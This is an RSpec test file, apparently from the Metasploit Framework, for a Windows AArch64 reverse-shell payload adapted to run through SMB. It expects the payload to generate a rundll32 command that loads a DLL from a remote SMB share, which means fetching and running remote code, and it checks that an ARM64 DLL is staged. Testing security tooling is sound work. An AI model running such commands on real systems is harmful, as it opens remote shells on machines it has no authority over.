require 'rspec'

RSpec.describe 'cmd/windows/smb/aarch64' do
  include_context 'Msf::Simple::Framework#modules loading'

  let(:payload) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'cmd/windows/smb/aarch64/shell_reverse_tcp',
      ancestor_reference_names: [
        'adapters/cmd/windows/smb/aarch64',
        'singles/windows/aarch64/shell_reverse_tcp'
      ]
    )
  end

  let(:fetch_srvhost) { '192.0.2.1' }

  before(:each) do
    payload.datastore.merge!(
      'LHOST' => '192.0.2.2',
      'LPORT' => 4444,
      'FETCH_SRVHOST' => fetch_srvhost,
      'FETCH_URIPATH' => 'testshare',
      'FETCH_FILENAME' => 'payload.dll'
    )
  end

  it 'adapts Windows AArch64 payloads to command payloads' do
    expect(payload.arch).to contain_exactly(ARCH_CMD)
    expect(payload.send(:module_info)['AdaptedArch']).to eq(ARCH_AARCH64)
    expect(payload.send(:module_info)['AdaptedPlatform']).to eq('win')
  end

  it 'generates a rundll32 command and stages an ARM64 DLL' do
    command = payload.generate
    resource = payload.instance_variable_get(:@srv_resources).first
    pe_offset = resource[:data].byteslice(0x3c, 4).unpack1('V')

    expect(command).to eq("rundll32 \\\\#{fetch_srvhost}\\testshare\\payload.dll,0")
    expect(resource[:data].byteslice(0, 2)).to eq('MZ')
    expect(resource[:data].byteslice(pe_offset + 4, 2).unpack1('v')).to eq(0xaa64)
    expect(resource[:opts][:arch]).to contain_exactly(ARCH_AARCH64)
  end
end
